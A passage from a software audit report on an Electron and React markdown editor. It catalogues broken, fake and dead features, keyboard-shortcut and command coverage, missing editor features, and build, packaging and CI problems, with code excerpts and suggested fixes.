Better: render the document into a detached, print-only container first (which is what `generateStandaloneHtml` already gives you) and print that. Also relabel the button "Print…" so it stops claiming to be a PDF exporter.

#### [HIGH] F10. Ten dependencies are declared and never imported
- **Type:** DEAD
- **File:** `package.json:35,38,41-42,45,48,55,59,62,64`
- **Code:** `"@google/genai": "^2.4.0"`, `"@types/jszip"`, `"jszip"`, `"dotenv"`, `"express"`, `"@types/express"`, `"motion"`, `"autoprefixer"`, `"esbuild"`, `"tsx"`
- **Why it fails / what's missing:** `grep` over `src/` and `electron/` finds **zero** imports of any of them. Consequences beyond bloat: `@google/genai` drags in `google-auth-library`, `protobufjs` and `ws`; `express` + `@types/express` add ~30 transitive packages; `motion` adds `framer-motion`, `motion-dom`, `motion-utils`. It also actively breaks `npm install` (F1). The AI-Studio story implied by `metadata.json`, `.env.example` and `vite.config.ts:62` has been deleted from the source but left behind in the manifest and dependency list.
- **Fix:** Delete all ten. Then either implement the Gemini feature (`new GoogleGenAI({ apiKey })` behind a `services/ai.ts` that fails gracefully when the key is absent) or drop `MAJOR_CAPABILITY_SERVER_SIDE_GEMINI_API`, `.env.example` and the `AI Studio` comments.

#### [HIGH] F11. "Clear History" and per-file delete do not clear anything
- **Type:** BROKEN
- **File:** `storage.ts:23-52` vs `storage.ts:158-177`
- **Code:**
```ts
// getRecentFiles
const records = await get<MarkdownFileRecord[]>(STORAGE_KEYS.RECENT_FILES);
if (records && records.length > 0) { return records; }
…
// Initialize with initial samples
const initialFiles: MarkdownFileRecord[] = SAMPLE_FILES.map(…);
await saveAllRecentFiles(initialFiles);
return initialFiles;
```
- **Why it fails / what's missing:** "Empty" is overloaded to mean "not initialised yet". `clearFileHistory()` writes `[]`, and the very next `getRecentFiles()` sees `length === 0` and **re-seeds the three sample documents**. The same happens after `deleteFileRecord(sample-welcome)`. Net: clicking **Clear History** (`HomePage.tsx:373`) empties the React state so the table looks cleared and a toast says "File history cleared" — but on the next reload, or the next pin/save, the three fabricated samples are back and can't be removed for good. The `HomePage.tsx:385` "File History is Empty" panel is therefore only reachable in the instant before a re-read.
- **Fix:** Distinguish "absent" from "empty" — check `records === undefined` for the seed, and add an explicit `seeded: true` flag in the settings record.

#### [HIGH] F12. CI never type-checks or tests, and duplicates every build
- **Type:** BROKEN
- **File:** `.github/workflows/build-windows-exe.yml:3-40`, `package.json:13`
- **Code:**
```yaml
on:
  push:
    branches: [ main, master ]
  pull_request:
    branches: [ main, master ]
…
      - run: npm install --legacy-peer-deps --no-audit --no-fund
      - run: npm run build
```
- **Why it fails / what's missing:** `npm run build` is `vite build`, which does **not** type-check. `npm run lint` (`tsc --noEmit`) exists but is **never invoked in CI**, so a type error ships. There is no test step, no test runner, no coverage. The same `push` + `pull_request` trigger means every PR branch builds twice. `permissions: contents: write` is granted but never used (no release/tag step). No `actions/setup-node` `cache:` (impossible without a `package-lock.json`). There is no code signing, so every build raises a SmartScreen warning. And because `build.files` omits `public/` (F-matrix #32) plus no preload (F2), the artifacts produced here are the broken app described above.
- **Fix:**
```yaml
      - run: npm ci # after committing package-lock.json
      - run: npm run lint
      - run: npm test
      - run: npm run build
```
Drop the `push` trigger for PRs from the same branch, and change `permissions` to `contents: read`.

---

#### [MEDIUM] F13. Status bar shows fake and frozen state
- **Type:** PARTIAL
- **File:** `StatusBar.tsx:74-88`
- **Code:**
```tsx
<span className="hidden sm:inline font-medium">Ln {cursorLine}, Col {cursorCol}</span>
…
<span className="font-semibold">CRLF</span>
…
<span className="…">Markdown (GFM)</span>
```
- **Why it fails / what's missing:** Real: `wordCount`/`charCount`/`readTime` (recomputed from `content`, `StatusBar.tsx:20-22`), `isDirty`, and the path. **Fake:** `CRLF` is a hardcoded literal — `handleSave` writes `activeTab.content` verbatim (`App.tsx:424`, `App.tsx:517`), so line endings are exactly what the source file had, i.e. almost always **LF**. The bar confidently asserts the wrong encoding. **Frozen:** `Ln/Col` comes from App-level `cursorPos` (`App.tsx:61`), updated only by `RawEditor`'s `onCursorChange` (`App.tsx:874,905`). In Preview-only mode `RawEditor` isn't mounted, so it reads `Ln 1, Col 1` forever. `cursorPos` is also global rather than per-tab, although `FileTab.cursorLine/cursorCol` (`types/index.ts:50-51`) exist and are written but never read.
- **Fix:** Derive line endings (`content.includes('\r\n') ? 'CRLF' : 'LF'`), hide `Ln/Col` in preview mode or compute from the preview selection, and move `cursorPos` into `FileTab`.

#### [MEDIUM] F14. Sample content metrics are fabricated and internally inconsistent
- **Type:** BROKEN
- **File:** `data/samples.ts:94-96, 148-150, 191-193`
- **Code:**
```ts
content: `# Welcome to Velox Markdown Studio …`,
size: 3420, wordCount: 420, readingTimeMinutes: 2,
```
- **Why it fails / what's missing:** Measured against the actual literals: sample 1 is **456 words / 3537 bytes** (declared 420 / 3420); sample 2 is **122 words / 1113 bytes** (declared 160 / 1450); sample 3 is **91 words / 617 bytes** (declared 110 / 980). The declared `readingTimeMinutes` also contradicts the app's own formula — `calculateReadingTime(420)` is `Math.ceil(420/200) = 3`, not the declared `2`. These are the numbers rendered in the "Size & Metrics" column (`HomePage.tsx:291,487`) and the sample cards (`SampleFilesModal.tsx:68-70`), so the app's first-impression statistics are wrong. On top of that the samples are lorem-style marketing fiction — "Project Nebula Core Engine", a fake benchmark table claiming "✅ Full Highlighting" and "✅ Included (.bat / PWA)" (`samples.ts:84-90`) — where `.bat` installers do not exist and PWA install is dead (F-matrix #19, #20).
- **Fix:** Compute `size`/`wordCount`/`readingTimeMinutes` from `content` at module load via the existing `calculateWordCount`/`calculateReadingTime` helpers, and replace the fiction with genuinely useful samples (a GFM feature tour, an empty template, a real-world README).

#### [MEDIUM] F15. Lightbox has no keyboard navigation at all
- **Type:** PARTIAL
- **File:** `ImageLightboxModal.tsx:22-29`, `MarkdownPreview.tsx:106-110`
- **Code:**
```tsx
if (!imageSrc) return null;
…
<img src={imageSrc} alt={imageAlt}
 style={{ transform: `scale(${scale})`, transformOrigin: 'center center' } } />
```
- **Why it fails / what's missing:** The modal *is* correctly wired (`MarkdownPreview.tsx:107` → `App.tsx:887,916` → `App.tsx:991`) and the ± buttons work (`ImageLightboxModal.tsx:47,57`). But: no `keydown` listener, so **Esc does not close it**, there is no **next/previous image** navigation within a document, no `+`/`-`/wheel zoom, and no `Home`/`0` reset. The documented contract "Esc → close … lightbox" (`ShortcutsModal.tsx:86`) is unmet. Also `Download` is imported (`:2`) and never used, and zoom via CSS `transform` doesn't change the layout box, so the image visually overflows its `max-h-[70vh]` box while the scroll container's size is unchanged.
- **Fix:** Pass the document's image list (`string[]`) and an index into the modal, then:
```tsx
useEffect(() => {
  if (!imageSrc) return;
  const onKey = (e: KeyboardEvent) => {
    if (e.key === 'Escape') onClose();
    if (e.key === 'ArrowRight') go(1);
    if (e.key === 'ArrowLeft') go(-1);
    if (e.key === '+' || e.key === '=') setScale(s => Math.min(s + 0.25, 3));
    if (e.key === '-') setScale(s => Math.max(s - 0.25, 0.5));
  };
  window.addEventListener('keydown', onKey);
  return () => window.removeEventListener('keydown', onKey);
}, [imageSrc]);
```

#### [MEDIUM] F16. Unsaved work is destroyed without warning, three different ways
- **Type:** BROKEN
- **File:** `App.tsx:592-608`, `electron/main.cjs:44-58`, `App.tsx:969`
- **Code:**
```tsx
// App.tsx:592 — "// Close tab instantly without blocking dialogs"
const handleCloseTab = useCallback((fileId: string) => {
  const tabToClose = tabs.find((t) => t.fileId === fileId);
  const remaining = tabs.filter((t) => t.fileId !== fileId);
  setTabs(remaining);
```
- **Why it fails / what's missing:** (a) `Ctrl+W` closes the active tab with **no `isDirty` check**. (b) There is **no `beforeunload` handler anywhere**, so `Alt+F4`, the native title-bar X, `TitleBar.tsx:153`'s `window.close()`, or `app.quit()` all discard dirty tabs silently. (c) Switching to the Home tab and back is safe, but a full reload loses everything except the first recent file (`App.tsx:146-161` only restores one tab, and never its content). There is no autosave — `AppSettings.autoSave` exists (`types/index.ts:65`) and is hardcoded `false` with no implementation.
- **Fix:**
```tsx
useEffect(() => {
  const h = (e: BeforeUnloadEvent) => {
    if (tabs.some(t => t.isDirty)) { e.preventDefault(); e.returnValue = ''; }
  };
  window.addEventListener('beforeunload', h);
  return () => window.removeEventListener('beforeunload', h);
}, [tabs]);
```
Plus a dirty-tab confirm inside `handleCloseTab`, and in `main.cjs`:
```js
win.on('close', (e) => { /* coordinate with renderer before quitting */ });
```

#### [MEDIUM] F17. Settings persistence is one-sixth implemented
- **Type:** PARTIAL
- **File:** `App.tsx:106-121, 124-140`, `services/storage.ts:12-21`
- **Code:**
```tsx
const settings = getAppSettings();
setTheme(settings.theme || 'dark');
setFontSize(settings.fontSize || 16);
setWordWrap(settings.wordWrap !== false);
setSyncScroll(settings.syncScroll !== false);
…
// the only write:
const settings = getAppSettings();
saveAppSettings({ ...settings, theme: next });
```
- **Why it fails / what's missing:** `fontSize`, `wordWrap` and `syncScroll` are **read but never written** — `saveAppSettings` has exactly one caller, inside `handleToggleTheme`. Zoom, word-wrap and sync-scroll therefore reset to defaults on every launch even though the settings schema, the UI and the loading code all pretend they persist. Additionally `DEFAULT_SETTINGS.fontSize = 14` (`storage.ts:15`) while `App.tsx:42` initialises to `16` and `App.tsx:110` uses `settings.fontSize || 16`, so first-run font size depends on which path executed. Four other declared settings (`accentColor`, `lineNumbers`, `defaultViewMode`, `autoSave`) have **no UI and no reader** anywhere — dead schema.
- **Fix:** One effect that persists the whole slice:
```tsx
useEffect(() => {
  saveAppSettings({ ...getAppSettings(), fontSize, wordWrap, syncScroll });
}, [fontSize, wordWrap, syncScroll]);
```
Then either build UI for `accentColor` / `lineNumbers` / `defaultViewMode` / `autoSave` or delete them from `AppSettings`.

#### [MEDIUM] F18. PWA integration is dead code that also breaks the Electron build
- **Type:** DEAD (web install) / BROKEN (Electron)
- **File:** `hooks/usePWAInstall.ts` (whole file), `vite.config.ts:15-54`, `src/main.tsx`
- **Code:**
```ts
export function usePWAInstall() { … return { isInstallable, isInstalled, isIOS, install }; }
```
- **Why it fails / what's missing:** `usePWAInstall` is **imported by nothing** — `src/main.tsx` is five lines that only mount `<App/>`, and no component calls it. So `beforeinstallprompt` is never intercepted, there is no install button, and the "one-click PWA desktop installation" claim at `samples.ts:23` is false. Meanwhile `injectRegister` defaults to `'auto'`, which (because no `virtual:pwa-register` import exists) downgrades to `'script'` mode — a `registerSW.js` **is** emitted and injected into `index.html`. Over `file://` in Electron, service-worker registration is rejected (`The URL protocol of the current origin ('file://') is not supported` — electron#2831, #9705), so every launch logs an error. `devOptions.enabled: true` additionally injects a dev SW during `vite dev`, which can fight HMR. Manifest hygiene: `theme_color: '#0f172a'` contradicts `index.html:12`'s `#0078d4`; `start_url`, `scope`, `id` and every `icons[].src` are absolute `/…` while `base: './'`.
- **Fix:** Either delete the PWA layer for the desktop target (`VitePWA({ disable: true })` in the electron build, `manifest: false`, drop `usePWAInstall`), or commit to web and actually wire it:
```tsx
import { useRegisterSW } from 'virtual:pwa-register/react';
const { needRefresh: [needRefresh], updateServiceWorker } = useRegisterSW();
```
and surface a real install button from `usePWAInstall`. Make icon URLs base-relative and unify `theme_color`.

#### [MEDIUM] F19. `npm run clean` is broken on Windows and points at a file that doesn't exist
- **Type:** BROKEN
- **File:** `package.json:12`
- **Code:** `"clean": "rm -rf dist server.js"`
- **Why it fails / what's missing:** Two problems. (1) `npm run` on Windows uses `cmd.exe`, where `rm` is not a builtin → `'rm' is not recognized as an internal or external command`. (2) **`server.js` does not exist** anywhere in the repo — it is the fossil of a deleted Express server, matching `express`/`dotenv`/`tsx` still sitting in `dependencies`. The script also races with `vite build`'s output.
- **Fix:** `"clean": "rimraf dist release dev-dist"` (`rimraf` is already a transitive dep — promote it to devDependencies), and drop the `server.js` reference.

#### [MEDIUM] F20. `tsc --noEmit` passes but the config makes it near-useless
- **Type:** PARTIAL
- **File:** `tsconfig.json`, `package.json:13`
- **Code:**
```json
{ "compilerOptions": { "target": "ES2022", … }, }
```
- **Why it fails / what's missing:** I ran `npm run lint` after a `--legacy-peer-deps` install: it **exits 0** — so the tree is type-clean. But the config has **no `strict`** (so no `strictNullChecks`, no `noImplicitAny`), **no `noUnusedLocals`/`noUnusedParameters`**, and **no `include`/`exclude`**. Consequences: the ~10 unused lucide imports go unnoticed (`CommandBar.tsx:21 Printer`, `CommandPalette.tsx:12 Download`, `HomePage.tsx:10,12 Laptop,CheckCircle`, `ExportModal.tsx:2 Sparkles`, `ImageLightboxModal.tsx:2 Download`, `ShortcutsModal.tsx:2 Sparkles,Command`); `any` casts at `App.tsx:243,504`, `App.tsx:400`, `markdown.ts:72` are unchecked; and with `allowJs: true` and no `exclude`, a future `dist/` build would also be pulled into the program.
- **Fix:**
```json
{
  "compilerOptions": { "strict": true, "noUnusedLocals": true, "noUnusedParameters": true,
 "noFallthroughCasesInSwitch": true, "noEmit": true },
  "include": ["src", "vite.config.ts"],
  "exclude": ["node_modules", "dist", "release", "dev-dist"]
}
```
Expect a short cleanup list on first run — the unused imports above are exactly what it should surface.

---

#### [LOW] F21. TitleBar receives two props it never uses
- **Type:** DEAD
- **File:** `TitleBar.tsx:6-13, 15-20`; passed at `App.tsx:789-790`
- **Code:**
```tsx
interface TitleBarProps { …; onNewFile: () => void; onOpenFile: () => void; }
export const TitleBar: React.FC<TitleBarProps> = ({ activeTab, theme, onToggleTheme, onOpenSearch }) => {
```
- **Why it fails / what's missing:** `onNewFile` and `onOpenFile` are declared and supplied by `App.tsx:789-790` but never destructured, so the title bar has no New/Open affordance. Dead API surface.
- **Fix:** Either add the two buttons or delete the props from the interface and the call site.

#### [LOW] F22. The whole document is re-parsed twice per keystroke
- **Type:** PARTIAL
- **File:** `ExportModal.tsx:25-30`
- **Code:**
```tsx
const htmlContent = React.useMemo(() => {
  const body = parseMarkdown(markdownContent);
  return generateStandaloneHtml(fileName, markdownContent, body);
}, [fileName, markdownContent]);

if (!isOpen) return null;      // ← the memo runs BEFORE this guard
```
- **Why it fails / what's missing:** `ExportModal` is always mounted (`App.tsx:946`) and the early return sits *after* the `useMemo`, so a full `marked` parse plus a full standalone-HTML string build happens on **every** keystroke, on top of the preview's own parse. On a large document with many fenced code blocks (`highlightAuto` is re-run too, `markdown.ts:36`) typing lags noticeably.
- **Fix:** Gate on `isOpen`:
```tsx
const htmlContent = React.useMemo(() => {
  if (!isOpen) return '';
  const body = parseMarkdown(markdownContent);
  return generateStandaloneHtml(fileName, markdownContent, body);
}, [isOpen, fileName, markdownContent]);
```

#### [LOW] F23. `RawEditor` renders one DOM node per line and disables scroll sync in Raw-only mode
- **Type:** PARTIAL
- **File:** `RawEditor.tsx:332-336`, `App.tsx:864-876`
- **Code:**
```tsx
{lines.map((_, i) => (<div key={i} className="h-6">{i + 1}</div>))}
```
- **Why it fails / what's missing:** A `<div>` per line with no virtualisation or `content-visibility` — a 10 000-line file mounts 10 000 elements on every render (the memo at `RawEditor.tsx:44` only guards `split('\n')`, not rendering). Separately, `App.tsx:866-875` omits `onScrollPercentage` in Raw-only mode, so nothing is lost (there's no preview to sync) — but `App.tsx:904` passes it only in Split, which means the Sync Scroll toggle at `CommandBar.tsx:197` is correctly hidden outside Split. Just noting the unvirtualised gutter.
- **Fix:** `content-visibility: auto; contain-intrinsic-size: 0 1.5rem;` on the gutter rows, or virtualise to `visibleLineStart-50 … +100`.

#### [LOW] F24. Markdown line endings, `> [!TIP]` callouts and `hello` empty-state spacing
- **Type:** PARTIAL
- **File:** `markdown.ts:72-77`, `index.css:284-290`, `data/samples.ts:10-11,116-117`
- **Code:**
```ts
blockquote(token: any) {
  const rawText = token.text || '';
  const parsedContent = markedInstance.parse(rawText);
  return `<blockquote class="… [&>p]:m-0">${parsedContent}</blockquote>`;
}
```
- **Why it fails / what's missing:** (a) The renderer reads `token.text` instead of `token.tokens` / `this.parser.parse(token.tokens)`, so blockquote bodies are re-parsed from raw text — nested lists/emphasis inside multi-line blockquotes are unreliable. (b) The `> [!TIP]` / `> [!IMPORTANT]` / `> [!WARNING]` GitHub alert syntax used in all three samples is **not** implemented — `marked` has no alerts extension, so they render as plain italic blockquotes while the samples present them as callouts. (c) `[&>p]:m-0` is a Tailwind arbitrary variant fighting `index.css:284-290`, which sets `margin-bottom: 1.25rem` on `blockquote` and `p`; the `.markdown-body` rules are plain CSS and win on specificity ties depending on layer order, producing inconsistent blockquote padding. (d) `breaks: true` (`markdown.ts:6`) silently converts single newlines to `<br>`, which is a non-GFM opinionated choice not disclosed anywhere — it changes how your Markdown renders versus GitHub.
- **Fix:** Use `this.parser.parse(token.tokens)`; add a small `walkTokens` extension for GitHub alerts; drop `breaks: true` or document it.

---

### Keyboard shortcut matrix

| Shortcut | Documented | Implemented | Works | Notes |
|---|---|---|---|---|
| `Ctrl+S` | ✅ `ShortcutsModal.tsx:19` | ✅ `App.tsx:643-649` | ⚠️ | Writes to disk only if a `FileSystemFileHandle` exists; otherwise silently saves to IndexedDB and toasts a *different* message (`App.tsx:495`). Under Electron this is the common case (F2). |
| `Ctrl+Shift+S` | ✅ `:24` | ✅ `App.tsx:645-646` | ⚠️ | `showSaveFilePicker` → falls back to a browser download under `file://`. |
| `Ctrl+O` | ✅ `:29` | ✅ `App.tsx:650-652` | ⚠️ | Read-only fallback; no handle ⇒ file can never be saved back. |
| `Ctrl+N` | ✅ `:34` | ✅ `App.tsx:653-655` | ✅ | Works. New tabs start `isDirty: true` with `originalContent: ''` (`App.tsx:370`). |
| `Ctrl+K` | ✅ `:41` | ✅ `App.tsx:661-663` | ✅ | Toggles. Also shown on the TitleBar fake search bar (`:92`). |
| `Ctrl+F` | ✅ `:46` | ⚠️ `RawEditor.tsx:123-126` | ⚠️ | Bound to the `<textarea>`'s `onKeyDown` ⇒ **dead in Preview mode** (the default opening view). |
| `Ctrl+H` | ✅ `:51` | ⚠️ `RawEditor.tsx:127-130` | ⚠️ | Same limitation. `handleReplaceAll` uses `replaceAll` (`:229`) — case-sensitive, unlike the case-insensitive highlight (`RawEditor.tsx:188-189`). |
| `Ctrl+B` | ✅ `:58` | ⚠️ `RawEditor.tsx:131-133` | ⚠️ | Editor-only, but the CommandBar tooltip (`CommandBar.tsx:224`) advertises it globally. |
| `Ctrl+I` | ✅ `:63` | ⚠️ `RawEditor.tsx:134-136` | ⚠️ | Same. |
| `Tab` | ✅ `:68` | ✅ `RawEditor.tsx:110-122` | ⚠️ | Inserts 2 spaces only. No Shift+Tab dedent, no block indent, no way to escape the field. |
| `Ctrl+P` | ✅ `:75` **and** `CommandPalette.tsx:137` | ❌ **nowhere** | ❌ | Two separate places promise it. Browser print is never intercepted. |
| `F11` | ✅ `:80` | ❌ **nowhere** | ❌ | Fullscreen exists as a mouse-only button (`TitleBar.tsx:142`), with no `fullscreenchange` listener so its label desyncs. |
| `Esc` | ✅ `:85` (and footer tip `:245`) | ⚠️ `CommandPalette.tsx:178` only | ⚠️ | Works in the palette. **Dead** in ShortcutsModal, ExportModal, SampleFilesModal and **ImageLightboxModal** — none registers a keydown handler. |
| `Ctrl+W` | ❌ (only a TabBar tooltip, `TabBar.tsx:101`) | ✅ `App.tsx:656-660` | ⚠️ | Implemented but undocumented, and it **silently discards unsaved changes** (F16). No longer collides with Electron's menu accelerator because `Menu.setApplicationMenu(null)` (`main.cjs:6`) removes the default menu. |
| `Ctrl+/` | ❌ | ✅ `App.tsx:664` | ✅ | Opens Shortcuts. Undocumented. |
| `F1` | ❌ | ✅ `App.tsx:664` | ✅ | Opens Shortcuts. Undocumented. |
| `Ctrl+Tab` / `Ctrl+Shift+Tab` | ❌ | ❌ | ❌ | No tab cycling between open tabs. |
| `Ctrl+1…9` | ❌ | ❌ | ❌ | No direct tab selection. |
| `Ctrl+P` (browser) | — | not prevented | ❌ | Never intercepted, so the browser/Electron print dialog can fire on a *stale* DOM state. |
| `F5` / `Ctrl+R` | ❌ | ❌ | ❌ | No reload binding. With `Menu.setApplicationMenu(null)` there is no reload accelerator either ⇒ **the packaged app has no way to reload**, and dirty work is unreachable without a restart. |
| `Ctrl+Shift+I` / `F12` | ❌ | ❌ | ❌ | The menu that normally supplies the DevTools accelerator is removed at `main.cjs:6`, and there is no `webContents.on('devtools-opened')`/`before-input-event` replacement ⇒ **no DevTools access in the shipped app**, so F2–F12 are undiagnosable by users. |
| `Ctrl+Shift+I` note | — | — | ⚠️ | If you *want* devtools in dev builds: `win.webContents.on('before-input-event', (_, e) => { if (e.key === 'F12') win.webContents.toggleDevTools(); })`. |

---

### Command matrix

| Command (`CommandPalette.tsx`) | Wired | Works | Blocked by |
|---|---|---|---|
| Keyboard Shortcuts Reference (`:79`) | ✅ `App.tsx:967` | ✅ | — |
| New Markdown Document (`:86`) | ✅ `App.tsx:961` | ✅ | — |
| Open File from Windows (`:93`) | ✅ `App.tsx:962` | ⚠️ | Silently degrades to a read-only `<input type=file>` under `file://` (F2). |
| Save Current File (`:100`) | ✅ `App.tsx:963` | ❌ **no-op on Home** | `handleSave` early-returns at `App.tsx:417` (`if (!activeTab) return;`) — no toast, no feedback. |
| Save As Another File (`:107`) | ✅ `App.tsx:964` | ❌ **no-op on Home** | Same guard at `App.tsx:500`. |
| Switch to Preview Mode (`:114`) | ✅ `App.tsx:965` | ❌ **no-op on Home** | `handleChangeViewMode` early-returns at `App.tsx:586` (`if (!activeTabId) return;`). |
| Switch to Raw Code Editor (`:121`) | ✅ `App.tsx:965` | ❌ **no-op on Home** | Same guard. |
| Switch to Split Dual View (`:128`) | ✅ `App.tsx:965` | ❌ **no-op on Home** | Same guard. |
| Print / Save as PDF (`:135`) | ⚠️ mislabelled | ⚠️ | `App.tsx:968` maps `onPrintPdf` to `setShowExportModal(true)` — it opens the Export modal; the user must then click "Print". The advertised "Ctrl+P" does nothing (F-matrix #26). |
| Browse Sample Markdown Library (`:142`) | ✅ `App.tsx:966` | ⚠️ | Modal opens, but `onSelectSample` → `App.tsx:189` `if (!record) return;` → clicking a sample is a **silent no-op** if it isn't in IndexedDB (after Clear History / delete — F11). |
| File entries (`:65-74`) | ✅ `App.tsx:960` | ⚠️ | Same `App.tsx:189` silent-return. |
| **Missing:** Toggle theme | ❌ | ❌ | No palette entry (only the TitleBar button). |
| **Missing:** Toggle sync scroll / word wrap | ❌ | ❌ | No palette entries. |
| **Missing:** Zoom in / out | ❌ | ❌ | No palette entries. |
| **Missing:** Close tab | ❌ | ❌ | No palette entry. |
| **Missing:** Pin / unpin file, delete file, clear history | ❌ | ❌ | HomePage-only affordances; unreachable from the palette. |
| **Missing:** Export… | ❌ | ❌ | The palette has no Export command even though the toolbar does. |

---

### Missing core features for a markdown editor

**Data safety — highest value, all absent**
- **Autosave / crash recovery** — none; `AppSettings.autoSave` is declared and dead. Debounced `saveFileRecord` per dirty tab. **M**
- **Session restore of open tabs + content** — only one tab is restored (`App.tsx:146-161`), content never is. Persist the tab array. **S**
- **Dirty-close / `beforeunload` guard** — absent (F16). **S**
- **External-change detection** — no `FileSystemObserver`, no mtime check. A file edited in Notepad will be silently overwritten by `Ctrl+S`. Re-stat on focus + warn. **M**
- **Multi-file workspace / folder open** — `showDirectoryPicker` never used; only single files. **L**

**Editing**
- **Outline / TOC sidebar** — absent; headings are parsed by `marked` but never extracted. Recursive heading walk → clickable sidebar. **M**
- **Spellcheck** — explicitly disabled (`RawEditor.tsx:348`) with no toggle. **S**
- **Undo/redo across tabs and in Preview** — native-textarea-only, and the controlled-component write pattern breaks the native stack. **M**
- **Paste-from-clipboard as Markdown** — no `paste` handler anywhere; pasting from a browser drops HTML soup into the source. **S**
- **Drag-drop / paste images** — images are explicitly ignored by the drop filter (`App.tsx:711`). No upload, no local-asset rewriting, so exported HTML is not self-contained for local images. **M**
- **Frontmatter / YAML editor** — frontmatter renders as a horizontal rule plus text; no `gray-matter`, no toggle. **M**
- **Tags** — `MarkdownFileRecord.tags` exists and is written with placeholder values (`['Windows File']`, `['Imported']`, `['Draft']`, `['Edited']`, `['Dropped File']`) but there is **no tag UI and no tag filtering anywhere**. The "tags" in `CommandPalette.tsx:71` are always those literals. **M**
- **Custom keyboard-shortcut remapping** — hardcoded. **M**

**Navigation / find**
- **Ctrl+P "Print"** — documented twice, unimplemented (F-matrix #26). **S**
- **F11** — documented, unimplemented. **S**
- **Global Esc** — modal-by-modal; 4 of 5 modals ignore it. **S**
- **Find across all open tabs / regex / whole-word / case toggle** — `RawEditor.tsx` has plain-substring find only. **M**
- **Go-to-heading / go-to-line** — line jump exists via search results only. **S**

**Output**
- **Real PDF / DOCX / EPUB export** — `window.print()` + no print CSS (F9); jszip declared but unused. **L** (PDF via print CSS: **M**)
- **Themes** — exactly two hardcoded themes; `--accent-*` CSS vars in `index.css:5-9` are **never used**, and `accentColor` is a dead setting. A theme picker + accent application would consume existing scaffolding. **M**
- **Backlinks / wiki-links** — absent. **L**
- **Sync to cloud (Drive/Dropbox/OneDrive/git)** — absent. **L**
- **Collaborative editing** — absent. **L**
- **Command palette coverage** — 8 real actions missing (see Command matrix). **S**

---

### Build, packaging & CI issues

**Install / dependency graph**
1. **`npm install` fails on a fresh clone** — `ERESOLVE`: `vite@8.3.2` needs optional peer `esbuild ^0.27.0 || ^0.28.0`, `package.json:63` pins `^0.25.0`. Reproduced via `npm install --dry-run`. `--legacy-peer-deps` is mandatory and undocumented (F1).
2. **Lockfile/package-manager mismatch** — the repo ships `bun.lock` (170 KB, `bun@`-format), but CI installs with **npm** (`.github/workflows/build-windows-exe.yml:32`) and `--legacy-peer-deps` to paper over the conflict. There is no `package-lock.json`, so builds are **not reproducible** and `actions/setup-node` `cache:` is impossible. Pick one PM; commit its lockfile.
3. **10 unused dependencies** — `@google/genai`, `jszip`, `@types/jszip`, `express`, `@types/express`, `dotenv`, `motion`, `autoprefixer`, `esbuild`, `tsx` (F10). `autoprefixer` is also pointless: Tailwind v4 runs through `@tailwindcss/vite` and there is **no `postcss.config.*` and no `tailwind.config.js`** anywhere.
4. **Dead AI-Studio scaffolding** — `metadata.json:5` declares `MAJOR_CAPABILITY_SERVER_SIDE_GEMINI_API` with **zero** implementation; `.env.example` ships `GEMINI_API_KEY`/`APP_URL` that nothing reads; `vite.config.ts:62-64` adds a `DISABLE_HMR` branch that no environment ever sets.

**Electron / packaging**
5. **`electron/main.cjs` CJS-vs-ESM is fine** — `"type": "module"` with `main: "electron/main.cjs"` is correct; `require()` in a `.cjs` is valid.
6. **No preload script at all** — `nodeIntegration:false` + `contextIsolation:true` and `build.files: ["dist/**/*","electron/**/*"]` contain no `preload`. The renderer therefore has **no** IPC channel, which is why minimize/maximize can't work (F6) and why native file dialogs aren't available (F2).
7. **`build.files` omits `public/`** — `main.cjs:17` points the window icon at `../public/favicon.ico`, which is **not packaged**. `build.win.icon` is also unset ⇒ the installer and `.exe` ship with the default Electron icon.
8. **Double title bar** — `frame: true` (`main.cjs:14`) plus the in-app fake caption buttons (`TitleBar.tsx:130-160`).
9. **No `will-navigate` / `setWindowOpenHandler` / CSP** — a Markdown link can navigate the editor away and discard unsaved tabs (F5).
10. **`window-all-closed` is correct** for Windows; missing niceties: `app.setAppUserModelId('com.veloxmd.studio')`, single-instance lock, `backgroundColor` is hardcoded `#0f172a` so light theme gets a dark flash.
11. **Path resolution block is dead weight** — `main.cjs:28-41` probes four candidate paths then falls back to the *same* first candidate it already tested; `process.resourcesPath || ''` produces a bogus `resources/app/dist/index.html` candidate. One correct path (`path.join(__dirname, '../dist/index.html')`) suffices.
12. **`npm run electron:build` runs `vite build && electron-builder --win`** but there is **no `electron:dev` script** — you cannot run the Electron shell against the Vite dev server.
13. **Service worker is injected into the Electron build** — `injectRegister` defaults to `'auto'` → `'script'` (no `virtual:pwa-register` import exists), so `registerSW.js` is emitted and referenced from `index.html`; registration fails on `file://` every launch (F18).

**Typecheck / quality gates**
14. **`npm run lint` passes (verified, exit 0) but is toothless** — no `strict`, no `noUnusedLocals`, no `include`/`exclude`, `allowJs:true`. It cannot catch any of the ~10 unused imports or the unchecked `any` casts (F20).
15. **CI never runs lint** and there is **no test runner at all** (no vitest/jest, no `test` script, no test files) — `vite build` does not type-check, so type errors ship.
16. **`.gitignore` misses build outputs** — no `release/` (the electron-builder output dir per `package.json:20-22`) and no `dev-dist/` (vite-plugin-pwa dev output). A built installer is committable.

**CI workflow**
17. **Builds twice** — `push` *and* `pull_request` on `main`/`master`.
18. **`permissions: contents: write`** granted but unused (no release/publish step).
19. **`shell: bash` on `windows-latest`** with paths like `release/*Setup*.exe` — works, but `if-no-files-found: warn` means a **completely failed packaging step still reports success** if it exits 0 while producing nothing. Should be `error`.
20. **No code signing** — every artifact triggers SmartScreen "unknown publisher".
21. **No `npm ci`** — see #2.

**Docs (all absent)**
22. **No `README.md`, no `LICENSE`, no `CONTRIBUTING.md`, no `CHANGELOG.md`** — yet `App.tsx:2-3` carries `SPDX-License-Identifier: Apache-2.0` and `metadata.json` claims Apache-2.0 nowhere; there is nothing licensing the code, nothing telling a user how to install (including the mandatory `--legacy-peer-deps`), and no statement that the app is a Windows-only Electron build with a web/PWA variant.

---

## 5. Architecture, Performance & Code Quality

**Target:** `Velox-Markdown-Studio` — Electron 33 + React 19 + Vite 8 + TS 7 + Tailwind v4
**Measured:** 22 source files, 4,372 non-blank lines (`App.tsx` = 896 non-blank / **998 raw** — the "896" figure is a `Measure-Object -Line` artifact that drops blank lines).
**Build status: cannot be built.** `npm install` fails hard. See **A1**.

---

### App.tsx responsibility map

`src/App.tsx` is 998 raw lines / ~24 distinct responsibilities. It is not a component; it is the application runtime with a JSX return statement attached.

| Responsibility | Lines | Extract to |
|---|---|---|
| Theme + view preferences state | 41-44 | `useSettings()` |
| Settings hydration + `document.body` class mutation | 106-121 | `useSettings()` |
| Theme toggle (state + DOM + persist + toast) | 124-140 | `useSettings()` |
